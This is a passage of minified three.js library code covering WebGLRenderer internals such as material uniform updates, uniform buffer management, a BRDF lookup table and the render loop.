f(m,u,g){m.ior.value=u.ior,u.sheen>0&&(m.sheenColor.value.copy(u.sheenColor).multiplyScalar(u.sheen),m.sheenRoughness.value=u.sheenRoughness,u.sheenColorMap&&(m.sheenColorMap.value=u.sheenColorMap,n(u.sheenColorMap,m.sheenColorMapTransform)),u.sheenRoughnessMap&&(m.sheenRoughnessMap.value=u.sheenRoughnessMap,n(u.sheenRoughnessMap,m.sheenRoughnessMapTransform))),u.clearcoat>0&&(m.clearcoat.value=u.clearcoat,m.clearcoatRoughness.value=u.clearcoatRoughness,u.clearcoatMap&&(m.clearcoatMap.value=u.clearcoatMap,n(u.clearcoatMap,m.clearcoatMapTransform)),u.clearcoatRoughnessMap&&(m.clearcoatRoughnessMap.value=u.clearcoatRoughnessMap,n(u.clearcoatRoughnessMap,m.clearcoatRoughnessMapTransform)),u.clearcoatNormalMap&&(m.clearcoatNormalMap.value=u.clearcoatNormalMap,n(u.clearcoatNormalMap,m.clearcoatNormalMapTransform),m.clearcoatNormalScale.value.copy(u.clearcoatNormalScale),u.side===hn&&m.clearcoatNormalScale.value.negate())),u.dispersion>0&&(m.dispersion.value=u.dispersion),u.iridescence>0&&(m.iridescence.value=u.iridescence,m.iridescenceIOR.value=u.iridescenceIOR,m.iridescenceThicknessMinimum.value=u.iridescenceThicknessRange[0],m.iridescenceThicknessMaximum.value=u.iridescenceThicknessRange[1],u.iridescenceMap&&(m.iridescenceMap.value=u.iridescenceMap,n(u.iridescenceMap,m.iridescenceMapTransform)),u.iridescenceThicknessMap&&(m.iridescenceThicknessMap.value=u.iridescenceThicknessMap,n(u.iridescenceThicknessMap,m.iridescenceThicknessMapTransform))),u.transmission>0&&(m.transmission.value=u.transmission,m.transmissionSamplerMap.value=g.texture,m.transmissionSamplerSize.value.set(g.width,g.height),u.transmissionMap&&(m.transmissionMap.value=u.transmissionMap,n(u.transmissionMap,m.transmissionMapTransform)),m.thickness.value=u.thickness,u.thicknessMap&&(m.thicknessMap.value=u.thicknessMap,n(u.thicknessMap,m.thicknessMapTransform)),m.attenuationDistance.value=u.attenuationDistance,m.attenuationColor.value.copy(u.attenuationColor)),u.anisotropy>0&&(m.anisotropyVector.value.set(u.anisotropy*Math.cos(u.anisotropyRotation),u.anisotropy*Math.sin(u.anisotropyRotation)),u.anisotropyMap&&(m.anisotropyMap.value=u.anisotropyMap,n(u.anisotropyMap,m.anisotropyMapTransform))),m.specularIntensity.value=u.specularIntensity,m.specularColor.value.copy(u.specularColor),u.specularColorMap&&(m.specularColorMap.value=u.specularColorMap,n(u.specularColorMap,m.specularColorMapTransform)),u.specularIntensityMap&&(m.specularIntensityMap.value=u.specularIntensityMap,n(u.specularIntensityMap,m.specularIntensityMapTransform))}function v(m,u){u.matcap&&(m.matcap.value=u.matcap)}function y(m,u){const g=e.get(u).light;m.referencePosition.value.setFromMatrixPosition(g.matrixWorld),m.nearDistance.value=g.shadow.camera.near,m.farDistance.value=g.shadow.camera.far}return{refreshFogUniforms:i,refreshMaterialUniforms:s}}function YA(t,e,n,i){let s={},r={},a=[];const o=t.getParameter(t.MAX_UNIFORM_BUFFER_BINDINGS);function l(g,_){const b=_.program;i.uniformBlockBinding(g,b)}function c(g,_){let b=s[g.id];b===void 0&&(v(g),b=p(g),s[g.id]=b,g.addEventListener("dispose",m));const T=_.program;i.updateUBOMapping(g,T);const A=e.render.frame;r[g.id]!==A&&(h(g),r[g.id]=A)}function p(g){const _=d();g.__bindingPointIndex=_;const b=t.createBuffer(),T=g.__size,A=g.usage;return t.bindBuffer(t.UNIFORM_BUFFER,b),t.bufferData(t.UNIFORM_BUFFER,T,A),t.bindBuffer(t.UNIFORM_BUFFER,null),t.bindBufferBase(t.UNIFORM_BUFFER,_,b),b}function d(){for(let g=0;g<o;g++)if(a.indexOf(g)===-1)return a.push(g),g;return $e("WebGLRenderer: Maximum number of simultaneously usable uniforms groups reached."),0}function h(g){const _=s[g.id],b=g.uniforms,T=g.__cache;t.bindBuffer(t.UNIFORM_BUFFER,_);for(let A=0,C=b.length;A<C;A++){const L=Array.isArray(b[A])?b[A]:[b[A]];for(let w=0,E=L.length;w<E;w++){const P=L[w];if(f(P,A,w,T)===!0){const G=P.__offset,V=Array.isArray(P.value)?P.value:[P.value];let Z=0;for(let O=0;O<V.length;O++){const z=V[O],F=y(z);typeof z=="number"||typeof z=="boolean"?(P.__data[0]=z,t.bufferSubData(t.UNIFORM_BUFFER,G+Z,P.__data)):z.isMatrix3?(P.__data[0]=z.elements[0],P.__data[1]=z.elements[1],P.__data[2]=z.elements[2],P.__data[3]=0,P.__data[4]=z.elements[3],P.__data[5]=z.elements[4],P.__data[6]=z.elements[5],P.__data[7]=0,P.__data[8]=z.elements[6],P.__data[9]=z.elements[7],P.__data[10]=z.elements[8],P.__data[11]=0):(z.toArray(P.__data,Z),Z+=F.storage/Float32Array.BYTES_PER_ELEMENT)}t.bufferSubData(t.UNIFORM_BUFFER,G,P.__data)}}}t.bindBuffer(t.UNIFORM_BUFFER,null)}function f(g,_,b,T){const A=g.value,C=_+"_"+b;if(T[C]===void 0)return typeof A=="number"||typeof A=="boolean"?T[C]=A:T[C]=A.clone(),!0;{const L=T[C];if(typeof A=="number"||typeof A=="boolean"){if(L!==A)return T[C]=A,!0}else if(L.equals(A)===!1)return L.copy(A),!0}return!1}function v(g){const _=g.uniforms;let b=0;const T=16;for(let C=0,L=_.length;C<L;C++){const w=Array.isArray(_[C])?_[C]:[_[C]];for(let E=0,P=w.length;E<P;E++){const G=w[E],V=Array.isArray(G.value)?G.value:[G.value];for(let Z=0,O=V.length;Z<O;Z++){const z=V[Z],F=y(z),I=b%T,X=I%F.boundary,K=I+X;b+=X,K!==0&&T-K<F.storage&&(b+=T-K),G.__data=new Float32Array(F.storage/Float32Array.BYTES_PER_ELEMENT),G.__offset=b,b+=F.storage}}}const A=b%T;return A>0&&(b+=T-A),g.__size=b,g.__cache={},this}function y(g){const _={boundary:0,storage:0};return typeof g=="number"||typeof g=="boolean"?(_.boundary=4,_.storage=4):g.isVector2?(_.boundary=8,_.storage=8):g.isVector3||g.isColor?(_.boundary=16,_.storage=12):g.isVector4?(_.boundary=16,_.storage=16):g.isMatrix3?(_.boundary=48,_.storage=48):g.isMatrix4?(_.boundary=64,_.storage=64):g.isTexture?Ie("WebGLRenderer: Texture samplers can not be part of an uniforms group."):Ie("WebGLRenderer: Unsupported uniform value type.",g),_}function m(g){const _=g.target;_.removeEventListener("dispose",m);const b=a.indexOf(_.__bindingPointIndex);a.splice(b,1),t.deleteBuffer(s[_.id]),delete s[_.id],delete r[_.id]}function u(){for(const g in s)t.deleteBuffer(s[g]);a=[],s={},r={}}return{bind:l,update:c,dispose:u}}const $A=new Uint16Array([12469,15057,12620,14925,13266,14620,13807,14376,14323,13990,14545,13625,14713,13328,14840,12882,14931,12528,14996,12233,15039,11829,15066,11525,15080,11295,15085,10976,15082,10705,15073,10495,13880,14564,13898,14542,13977,14430,14158,14124,14393,13732,14556,13410,14702,12996,14814,12596,14891,12291,14937,11834,14957,11489,14958,11194,14943,10803,14921,10506,14893,10278,14858,9960,14484,14039,14487,14025,14499,13941,14524,13740,14574,13468,14654,13106,14743,12678,14818,12344,14867,11893,14889,11509,14893,11180,14881,10751,14852,10428,14812,10128,14765,9754,14712,9466,14764,13480,14764,13475,14766,13440,14766,13347,14769,13070,14786,12713,14816,12387,14844,11957,14860,11549,14868,11215,14855,10751,14825,10403,14782,10044,14729,9651,14666,9352,14599,9029,14967,12835,14966,12831,14963,12804,14954,12723,14936,12564,14917,12347,14900,11958,14886,11569,14878,11247,14859,10765,14828,10401,14784,10011,14727,9600,14660,9289,14586,8893,14508,8533,15111,12234,15110,12234,15104,12216,15092,12156,15067,12010,15028,11776,14981,11500,14942,11205,14902,10752,14861,10393,14812,9991,14752,9570,14682,9252,14603,8808,14519,8445,14431,8145,15209,11449,15208,11451,15202,11451,15190,11438,15163,11384,15117,11274,15055,10979,14994,10648,14932,10343,14871,9936,14803,9532,14729,9218,14645,8742,14556,8381,14461,8020,14365,7603,15273,10603,15272,10607,15267,10619,15256,10631,15231,10614,15182,10535,15118,10389,15042,10167,14963,9787,14883,9447,14800,9115,14710,8665,14615,8318,14514,7911,14411,7507,14279,7198,15314,9675,15313,9683,15309,9712,15298,9759,15277,9797,15229,9773,15166,9668,15084,9487,14995,9274,14898,8910,14800,8539,14697,8234,14590,7790,14479,7409,14367,7067,14178,6621,15337,8619,15337,8631,15333,8677,15325,8769,15305,8871,15264,8940,15202,8909,15119,8775,15022,8565,14916,8328,14804,8009,14688,7614,14569,7287,14448,6888,14321,6483,14088,6171,15350,7402,15350,7419,15347,7480,15340,7613,15322,7804,15287,7973,15229,8057,15148,8012,15046,7846,14933,7611,14810,7357,14682,7069,14552,6656,14421,6316,14251,5948,14007,5528,15356,5942,15356,5977,15353,6119,15348,6294,15332,6551,15302,6824,15249,7044,15171,7122,15070,7050,14949,6861,14818,6611,14679,6349,14538,6067,14398,5651,14189,5311,13935,4958,15359,4123,15359,4153,15356,4296,15353,4646,15338,5160,15311,5508,15263,5829,15188,6042,15088,6094,14966,6001,14826,5796,14678,5543,14527,5287,14377,4985,14133,4586,13869,4257,15360,1563,15360,1642,15358,2076,15354,2636,15341,3350,15317,4019,15273,4429,15203,4732,15105,4911,14981,4932,14836,4818,14679,4621,14517,4386,14359,4156,14083,3795,13808,3437,15360,122,15360,137,15358,285,15355,636,15344,1274,15322,2177,15281,2765,15215,3223,15120,3451,14995,3569,14846,3567,14681,3466,14511,3305,14344,3121,14037,2800,13753,2467,15360,0,15360,1,15359,21,15355,89,15346,253,15325,479,15287,796,15225,1148,15133,1492,15008,1749,14856,1882,14685,1886,14506,1783,14324,1608,13996,1398,13702,1183]);let Jn=null;function KA(){return Jn===null&&(Jn=new Bw($A,16,16,Ir,ki),Jn.name="DFG_LUT",Jn.minFilter=qt,Jn.magFilter=qt,Jn.wrapS=wi,Jn.wrapT=wi,Jn.generateMipmaps=!1,Jn.needsUpdate=!0),Jn}class ZA{constructor(e={}){const{canvas:n=dw(),context:i=null,depth:s=!0,stencil:r=!1,alpha:a=!1,antialias:o=!1,premultipliedAlpha:l=!0,preserveDrawingBuffer:c=!1,powerPreference:p="default",failIfMajorPerformanceCaveat:d=!1,reversedDepthBuffer:h=!1,outputBufferType:f=yn}=e;this.isWebGLRenderer=!0;let v;if(i!==null){if(typeof WebGLRenderingContext<"u"&&i instanceof WebGLRenderingContext)throw new Error("THREE.WebGLRenderer: WebGL 1 is not supported since r163.");v=i.getContextAttributes().alpha}else v=a;const y=f,m=new Set([rh,sh,ih]),u=new Set([yn,ci,Ha,Ga,th,nh]),g=new Uint32Array(4),_=new Int32Array(4);let b=null,T=null;const A=[],C=[];let L=null;this.domElement=n,this.debug={checkShaderErrors:!0,onShaderError:null},this.autoClear=!0,this.autoClearColor=!0,this.autoClearDepth=!0,this.autoClearStencil=!0,this.sortObjects=!0,this.clippingPlanes=[],this.localClippingEnabled=!1,this.toneMapping=ai,this.toneMappingExposure=1,this.transmissionResolutionScale=1;const w=this;let E=!1;this._outputColorSpace=Cn;let P=0,G=0,V=null,Z=-1,O=null;const z=new St,F=new St;let I=null;const X=new je(0);let K=0,ne=n.width,ye=n.height,Le=1,Ke=null,Qe=null;const Y=new St(0,0,ne,ye),te=new St(0,0,ne,ye);let _e=!1;const De=new dh;let be=!1,qe=!1;const Nt=new bt,Ge=new H,et=new St,at={background:null,fog:null,environment:null,overrideMaterial:null,isScene:!0};let Fe=!1;function Et(){return V===null?Le:1}let k=i;function Mt(M,U){return n.getContext(M,U)}try{const M={alpha:!0,depth:s,stencil:r,antialias:o,premultipliedAlpha:l,preserveDrawingBuffer:c,powerPreference:p,failIfMajorPerformanceCaveat:d};if("setAttribute"in n&&n.setAttribute("data-engine",`three.js r${Qp}`),n.addEventListener("webglcontextlost",Ne,!1),n.addEventListener("webglcontextrestored",ct,!1),n.addEventListener("webglcontextcreationerror",tt,!1),k===null){const U="webgl2";if(k=Mt(U,M),k===null)throw Mt(U)?new Error("Error creating WebGL context with your selected attributes."):new Error("Error creating WebGL context.")}}catch(M){throw $e("WebGLRenderer: "+M.message),M}let Je,lt,Ee,R,x,D,$,ee,q,Te,le,we,ke,re,ue,Se,Me,ce,Be,N,fe,ae,me,ie;function J(){Je=new K1(k),Je.init(),ae=new VA(k,Je),lt=new V1(k,Je,e,ae),Ee=new BA(k,Je),lt.reversedDepthBuffer&&h&&Ee.buffers.depth.setReversed(!0),R=new Q1(k),x=new EA,D=new zA(k,Je,Ee,x,lt,ae,R),$=new G1(w),ee=new $1(w),q=new iE(k),me=new B1(k,q),Te=new Z1(k,q,R,me),le=new tT(k,Te,q,R),Be=new eT(k,lt,D),Se=new H1(x),we=new wA(w,$,ee,Je,lt,me,Se),ke=new qA(w,x),re=new TA,ue=new LA(Je),ce=new F1(w,$,ee,Ee,le,v,l),Me=new OA(w,le,lt),ie=new YA(k,R,lt,Ee),N=new z1(k,Je,R),fe=new J1(k,Je,R),R.programs=we.programs,w.capabilities=lt,w.extensions=Je,w.properties=x,w.renderLists=re,w.shadowMap=Me,w.state=Ee,w.info=R}J(),y!==yn&&(L=new iT(y,n.width,n.height,s,r));const oe=new jA(w,k);this.xr=oe,this.getContext=function(){return k},this.getContextAttributes=function(){return k.getContextAttributes()},this.forceContextLoss=function(){const M=Je.get("WEBGL_lose_context");M&&M.loseContext()},this.forceContextRestore=function(){const M=Je.get("WEBGL_lose_context");M&&M.restoreContext()},this.getPixelRatio=function(){return Le},this.setPixelRatio=function(M){M!==void 0&&(Le=M,this.setSize(ne,ye,!1))},this.getSize=function(M){return M.set(ne,ye)},this.setSize=function(M,U,j=!0){if(oe.isPresenting){Ie("WebGLRenderer: Can't change size while VR device is presenting.");return}ne=M,ye=U,n.width=Math.floor(M*Le),n.height=Math.floor(U*Le),j===!0&&(n.style.width=M+"px",n.style.height=U+"px"),L!==null&&L.setSize(n.width,n.height),this.setViewport(0,0,M,U)},this.getDrawingBufferSize=function(M){return M.set(ne*Le,ye*Le).floor()},this.setDrawingBufferSize=function(M,U,j){ne=M,ye=U,Le=j,n.width=Math.floor(M*j),n.height=Math.floor(U*j),this.setViewport(0,0,M,U)},this.setEffects=function(M){if(y===yn){console.error("THREE.WebGLRenderer: setEffects() requires outputBufferType set to HalfFloatType or FloatType.");return}if(M){for(let U=0;U<M.length;U++)if(M[U].isOutputPass===!0){console.warn("THREE.WebGLRenderer: OutputPass is not needed in setEffects(). Tone mapping and color space conversion are applied automatically.");break}}L.setEffects(M||[])},this.getCurrentViewport=function(M){return M.copy(z)},this.getViewport=function(M){return M.copy(Y)},this.setViewport=function(M,U,j,W){M.isVector4?Y.set(M.x,M.y,M.z,M.w):Y.set(M,U,j,W),Ee.viewport(z.copy(Y).multiplyScalar(Le).round())},this.getScissor=function(M){return M.copy(te)},this.setScissor=function(M,U,j,W){M.isVector4?te.set(M.x,M.y,M.z,M.w):te.set(M,U,j,W),Ee.scissor(F.copy(te).multiplyScalar(Le).round())},this.getScissorTest=function(){return _e},this.setScissorTest=function(M){Ee.setScissorTest(_e=M)},this.setOpaqueSort=function(M){Ke=M},this.setTransparentSort=function(M){Qe=M},this.getClearColor=function(M){return M.copy(ce.getClearColor())},this.setClearColor=function(){ce.setClearColor(...arguments)},this.getClearAlpha=function(){return ce.getClearAlpha()},this.setClearAlpha=function(){ce.setClearAlpha(...arguments)},this.clear=function(M=!0,U=!0,j=!0){let W=0;if(M){let B=!1;if(V!==null){const de=V.texture.format;B=m.has(de)}if(B){const de=V.texture.type,ge=u.has(de),he=ce.getClearColor(),xe=ce.getClearAlpha(),Ae=he.r,Pe=he.g,Ce=he.b;ge?(g[0]=Ae,g[1]=Pe,g[2]=Ce,g[3]=xe,k.clearBufferuiv(k.COLOR,0,g)):(_[0]=Ae,_[1]=Pe,_[2]=Ce,_[3]=xe,k.clearBufferiv(k.COLOR,0,_))}else W|=k.COLOR_BUFFER_BIT}U&&(W|=k.DEPTH_BUFFER_BIT),j&&(W|=k.STENCIL_BUFFER_BIT,this.state.buffers.stencil.setMask(4294967295)),k.clear(W)},this.clearColor=function(){this.clear(!0,!1,!1)},this.clearDepth=function(){this.clear(!1,!0,!1)},this.clearStencil=function(){this.clear(!1,!1,!0)},this.dispose=function(){n.removeEventListener("webglcontextlost",Ne,!1),n.removeEventListener("webglcontextrestored",ct,!1),n.removeEventListener("webglcontextcreationerror",tt,!1),ce.dispose(),re.dispose(),ue.dispose(),x.dispose(),$.dispose(),ee.dispose(),le.dispose(),me.dispose(),ie.dispose(),we.dispose(),oe.dispose(),oe.removeEventListener("sessionstart",gh),oe.removeEventListener("sessionend",vh),hs.stop()};function Ne(M){M.preventDefault(),em("WebGLRenderer: Context Lost."),E=!0}function ct(){em("WebGLRenderer: Context Restored."),E=!1;const M=R.autoReset,U=Me.enabled,j=Me.autoUpdate,W=Me.needsUpdate,B=Me.type;J(),R.autoReset=M,Me.enabled=U,Me.autoUpdate=j,Me.needsUpdate=W,Me.type=B}function tt(M){$e("WebGLRenderer: A WebGL context could not be created. Reason: ",M.statusMessage)}function Kn(M){const U=M.target;U.removeEventListener("dispose",Kn),pi(U)}function pi(M){n_(M),x.remove(M)}function n_(M){const U=x.get(M).programs;U!==void 0&&(U.forEach(function(j){we.releaseProgram(j)}),M.isShaderMaterial&&we.releaseShaderCache(M))}this.renderBufferDirect=function(M,U,j,W,B,de){U===null&&(U=at);const ge=B.isMesh&&B.matrixWorld.determinant()<0,he=s_(M,U,j,W,B);Ee.setMaterial(W,ge);let xe=j.index,Ae=1;if(W.wireframe===!0){if(xe=Te.getWireframeAttribute(j),xe===void 0)return;Ae=2}const Pe=j.drawRange,Ce=j.attributes.position;let ze=Pe.start*Ae,rt=(Pe.start+Pe.count)*Ae;de!==null&&(ze=Math.max(ze,de.start*Ae),rt=Math.min(rt,(de.start+de.count)*Ae)),xe!==null?(ze=Math.max(ze,0),rt=Math.min(rt,xe.count)):Ce!=null&&(ze=Math.max(ze,0),rt=Math.min(rt,Ce.count));const _t=rt-ze;if(_t<0||_t===1/0)return;me.setup(B,W,he,j,xe);let xt,ot=N;if(xe!==null&&(xt=q.get(xe),ot=fe,ot.setIndex(xt)),B.isMesh)W.wireframe===!0?(Ee.setLineWidth(W.wireframeLinewidth*Et()),ot.setMode(k.LINES)):ot.setMode(k.TRIANGLES);else if(B.isLine){let Re=W.linewidth;Re===void 0&&(Re=1),Ee.setLineWidth(Re*Et()),B.isLineSegments?ot.setMode(k.LINES):B.isLineLoop?ot.setMode(k.LINE_LOOP):ot.setMode(k.LINE_STRIP)}else B.isPoints?ot.setMode(k.POINTS):B.isSprite&&ot.setMode(k.TRIANGLES);if(B.isBatchedMesh)if(B._multiDrawInstances!==null)Wa("WebGLRenderer: renderMultiDrawInstances has been deprecated and will be removed in r184. Append to renderMultiDraw arguments and use indirection."),ot.renderMultiDrawInstances(B._multiDrawStarts,B._multiDrawCounts,B._multiDrawCount,B._multiDrawInstances);else if(Je.get("WEBGL_multi_draw"))ot.renderMultiDraw(B._multiDrawStarts,B._multiDrawCounts,B._multiDrawCount);else{const Re=B._multiDrawStarts,nt=B._multiDrawCounts,Ye=B._multiDrawCount,fn=xe?q.get(xe).bytesPerElement:1,Hs=x.get(W).currentProgram.getUniforms();for(let mn=0;mn<Ye;mn++)Hs.setValue(k,"_gl_DrawID",mn),ot.render(Re[mn]/fn,nt[mn])}else if(B.isInstancedMesh)ot.renderInstances(ze,_t,B.count);else if(j.isInstancedBufferGeometry){const Re=j._maxInstanceCount!==void 0?j._maxInstanceCount:1/0,nt=Math.min(j.instanceCount,Re);ot.renderInstances(ze,_t,nt)}else ot.render(ze,_t)};function mh(M,U,j){M.transparent===!0&&M.side===yi&&M.forceSinglePass===!1?(M.side=hn,M.needsUpdate=!0,ro(M,U,j),M.side=ls,M.needsUpdate=!0,ro(M,U,j),M.side=yi):ro(M,U,j)}this.compile=function(M,U,j=null){j===null&&(j=M),T=ue.get(j),T.init(U),C.push(T),j.traverseVisible(function(B){B.isLight&&B.layers.test(U.layers)&&(T.pushLight(B),B.castShadow&&T.pushShadow(B))}),M!==j&&M.traverseVisible(function(B){B.isLight&&B.layers.test(U.layers)&&(T.pushLight(B),B.castShadow&&T.pushShadow(B))}),T.setupLights();const W=new Set;return M.traverse(function(B){if(!(B.isMesh||B.isPoints||B.isLine||B.isSprite))return;const de=B.material;if(de)if(Array.isArray(de))for(let ge=0;ge<de.length;ge++){const he=de[ge];mh(he,j,B),W.add(he)}else mh(de,j,B),W.add(de)}),T=C.pop(),W},this.compileAsync=function(M,U,j=null){const W=this.compile(M,U,j);return new Promise(B=>{function de(){if(W.forEach(function(ge){x.get(ge).currentProgram.isReady()&&W.delete(ge)}),W.size===0){B(M);return}setTimeout(de,10)}Je.get("KHR_parallel_shader_compile")!==null?de():setTimeout(de,10)})};let sc=null;function i_(M){sc&&sc(M)}function gh(){hs.stop()}function vh(){hs.start()}const hs=new Z0;hs.setAnimationLoop(i_),typeof self<"u"&&hs.setContext(self),this.setAnimationLoop=function(M){sc=M,oe.setAnimationLoop(M),M===null?hs.stop():hs.start()},oe.addEventListener("sessionstart",gh),oe.addEventListener("sessionend",vh),this.render=function(M,U){if(U!==void 0&&U.isCamera!==!0){$e("WebGLRenderer.render: camera is not an instance of THREE.Camera.");return}if(E===!0)return;const j=oe.enabled===!0&&oe.isPresenting===!0,W=L!==null&&(V===null||j)&&L.begin(w,V);if(M.matrixWorldAutoUpdate===!0&&M.updateMatrixWorld(),U.parent===null&&U.matrixWorldAutoUpdate===!0&&U.updateMatrixWorld(),oe.enabled===!0&&oe.isPresenting===!0&&(L===null||L.isCompositing()===!1)&&(oe.cameraAutoUpdate===!0&&oe.updateCamera(U),U=oe.getCamera()),M.isScene===!0&&M.onBeforeRender(w,M,U,V),T=ue.get(M,C.length),T.init(U),C.push(T),Nt.multiplyMatrices(U.projectionMatrix,U.matrixWorldInverse),De.setFromProjectionMatrix(Nt,ii,U.reversedDepth),qe=this.localClippingEnabled,be=Se.init(this.clippingPlanes,qe),b=re.get(M,A.length),b.init(),A.push(b),oe.enabled===!0&&oe.isPresenting===!0){const ge=w.xr.getDepthSensingMesh();ge!==null&&rc(ge,U,-1/0,w.sortObjects)}rc(M,U,0,w.sortObjects),b.finish(),w.sortObjects===!0&&b.sort(Ke,Qe),Fe=oe.enabled===!1||oe.isPresenting===!1||oe.hasDepthSensing()===!1,Fe&&ce.addToRenderList(b,M),this.info.render.frame++,be===!0&&Se.beginShadows();const B=T.state.shadowsArray;if(Me.render(B,M,U),be===!0&&Se.endShadows(),this.info.autoReset===!0&&this.info.reset(),(W&&L.hasRenderPass())===!1){const ge=b.opaque,he=b.transmissive;if(T.setupLights(),U.isArrayCamera){const xe=U.cameras;if(he.length>0)for(let Ae=0,Pe=xe.length;Ae<Pe;Ae++){const Ce=xe[Ae];xh(ge,he,M,Ce)}Fe&&ce.render(M);for(let Ae=0,Pe=xe.length;Ae<Pe;Ae++){const Ce=xe[Ae];_h(b,M,Ce,Ce.viewport)}}else he.length>0&&xh(ge,he,M,U),Fe&&ce.render(M),_h(b,M,U)}V!==null&&G===0&&(D.updateMultisampleRenderTarget(V),D.updateRenderTargetMipmap(V)),W&&L.end(w),M.isScene===!0&&M.onAfterRender(w,M,U),me.resetDefaultState(),Z=-1,O=null,C.pop(),C.length>0?(T=C[C.length-1],be===!0&&Se.setGlobalState(w.clippingPlanes,T.state.camera)):T=null,A.pop(),A.length>0?b=A[A.length-1]:b=null};function rc(M,U,j,W){if(M.visible===!1)return;if(M.layers.test(U.layers)){if(M.isGroup)j=M.renderOrder;else if(M.isLOD)M.autoUpdate===!0&&M.update(U);else if(M.isLight)T.pushLight(M),M.castShadow&&T.pushShadow(M);else if(M.isSprite){if(!M.frustumCulled||De.intersectsSprite(M)){W&&et.setFromMatrixPosition(M.matrixWorld).applyMatrix4(Nt);const ge=le.update(M),he=M.material;he.visible&&b.push(M,ge,he,j,et.z,null)}}else if((M.isMesh||M.isLine||M.isPoints)&&(!M.frustumCulled||De.intersectsObject(M))){const ge=le.update(M),he=M.material;if(W&&(M.boundingSphere!==void 0?(M.boundingSphere===null&&M.computeBoundingSphere(),et.copy(M.boundingSphere.center)):(ge.boundingSphere===null&&ge.computeBoundingSphere(),et.copy(ge.boundingSphere.center)),et.applyMatrix4(M.matrixWorld).applyMatrix4(Nt)),Array.isArray(he)){const xe=ge.groups;for(let Ae=0,Pe=xe.length;Ae<Pe;Ae++){const Ce=xe[Ae],ze=he[Ce.materialIndex];ze&&ze.visible&&b.push(M,ge,ze,j,et.z,Ce)}}else he.visible&&b.push(M,ge,he,j,et.z,null)}}const de=M.children;for(let ge=0,he=de.length;ge<he;ge++)rc(de[ge],U,j,W)}function _h(M,U,j,W){const{opaque:B,transmissive:de,transparent:ge}=M;T.setupLightsView(j),be===!0&&Se.setGlobalState(w.clippingPlanes,j),W&&Ee.viewport(z.copy(W)),B.length>0&&so(B,U,j),de.length>0&&so(de,U,j),ge.length>0&&so(ge,U,j),Ee.buffers.depth.setTest(!0),Ee.buffers.depth.setMask(!0),Ee.buffers.color.setMask(!0),Ee.setPolygonOffset(!1)}function xh(M,U,j,W){if((j.isScene===!0?j.overrideMaterial:null)!==null)return;if(T.state.transmissionRenderTarget[W.id]===void 0){const ze=Je.has("EXT_color_buffer_half_float")||Je.has("EXT_color_buffer_float");T.state.transmissionRenderTarget[W.id]=new oi(1,1,{generateMipmaps:!0,type:ze?ki:yn,minFilter:Rs,samples:lt.samples,stencilBuffer:r,resolveDepthBuffer:!1,resolveStencilBuffer:!1,colorSpace:We.workingColorSpace})}const de=T.state.transmissionRenderTarget[W.id],ge=W.viewport||z;de.setSize(ge.z*w.transmissionResolutionScale,ge.w*w.transmissionResolutionScale);const he=w.getRenderTarget(),xe=w.getActiveCubeFace(),Ae=w.getActiveMipmapLevel();w.setRenderTarget(de),w.getClearColor(X),K=w.getClearAlpha(),K<1&&w.setClearColor(16777215,.5),w.clear(),Fe&&ce.render(j);const Pe=w.toneMapping;w.toneMapping=ai;const Ce=W.viewport;if(W.viewport!==void 0&&(W.viewport=void 0),T.setupLightsView(W),be===!0&&Se.setGlobalState(w.clippingPlanes,W),so(M,j,W),D.updateMultisampleRenderTarget(de),D.updateRenderTargetMipmap(de),Je.has("WEBGL_multisampled_render_to_texture")===!1){let ze=!1;for(let rt=0,_t=U.length;rt<_t;rt++){const xt=U[rt],{object:ot,geometry:Re,material:nt,group:Ye}=xt;if(nt.side===yi&&ot.layers.test(W.layers)){const fn=nt.side;nt.side=hn,nt.needsUpdate=!0,yh(ot,j,W,Re,nt,Ye),nt.side=fn,nt.needsUpdate=!0,ze=!0}}ze===!0&&(D.updateMultisampleRenderTarget(de),D.updateRenderTargetMipmap(de))}w.setRenderTarget(he,xe,Ae),w.setClearColor(X,K),Ce!==void 0&&(W.viewport=Ce),w.toneMapping=Pe}function so(M,U,j){const W=U.isScene===!0?U.overrideMaterial:null;for(let B=0,de=M.length;B<de;B++){const ge=M[B],{object:he,geometry:xe,group:Ae}=ge;let Pe=ge.material;Pe.allowOverride===!0&&W!==null&&(Pe=W),he.layers.test(j.layers)&&yh(he,U,j,xe,Pe,Ae)}}function yh(M,U,j,W,B,de){M.onBeforeRender(w,U,j,W,B,de),M.modelViewMatrix.multiplyMatrices(j.matrixWorldInverse,M.matrixWorld),M.normalMatrix.getNormalMatrix(M.modelViewMatrix),B.onBeforeRender(w,U,j,W,M,de),B.transparent===!0&&B.side===yi&&B.forceSinglePass===!1?(B.side=hn,B.needsUpdate=!0,w.renderBufferDirect(j,U,W,B,M,de),B.side=ls,B.needsUpdate=!0,w.renderBufferDirect(j,U,W,B,M,de),B.side=yi):w.renderBufferDirect(j,U,W,B,M,de),M.onAfterRender(w,U,j,W,B,de)}function ro(M,U,j){U.isScene!==!0&&(U=at);const W=x.get(M),B=T.state.lights,de=T.state.shadowsArray,ge=B.state.version,he=we.getParameters(M,B.state,de,U,j),xe=we.getProgramCacheKey(he);let Ae=W.programs;W.environment=M.isMeshStandardMaterial?U.environment:null,W.fog=U.fog,W.envMap=(M.isMeshStandardMaterial?ee:$).get(M.envMap||W.environment),W.envMapRotation=W.environment!==null&&M.envMap===null?U.environmentRotation:M.envMapRotation,Ae===void 0&&(M.addEventListener("dispose",Kn),Ae=new Map,W.programs=Ae);let Pe=Ae.get(xe);if(Pe!==void 0){if(W.currentProgram===Pe&&W.lightsStateVersion===ge)return bh(M,he),Pe}else he.uniforms=we.getUniforms(M),M.onBeforeCompile(he,w),Pe=we.acquireProgram(he,xe),Ae.set(xe,Pe),W.uniforms=he.uniforms;const Ce=W.uniforms;return(!M.isShaderMaterial&&!M.isRawShaderMaterial||M.clipping===!0)&&(Ce.clippingPlanes=Se.uniform),bh(M,he),W.needsLights=a_(M),W.lightsStateVersion=ge,W.needsLights&&(Ce.ambientLightColor.value=B.state.ambient,Ce.lightProbe.value=B.state.probe,Ce.directionalLights.value=B.state.directional,Ce.directionalLightShadows.value=B.state.directionalShadow,Ce.spotLights.value=B.state.spot,Ce.spotLightShadows.value=B.state.spotShadow,Ce.rectAreaLights.value=B.state.rectArea,Ce.ltc_1.value=B.state.rectAreaLTC1,Ce.ltc_2.value=B.state.rectAreaLTC2,Ce.pointLights.value=B.state.point,Ce.pointLightShadows.value=B.state.pointShadow,Ce.hemisphereLights.value=B.state.hemi,Ce.directionalShadowMap.value=B.state.directionalShadowMap,Ce.directionalShadowMatrix.value=B.state.directionalShadowMatrix,Ce.spotShadowMap.value=B.state.spotShadowMap,Ce.spotLightMatrix.value=B.state.spotLightMatrix,Ce.spotLightMap.value=B.state.sp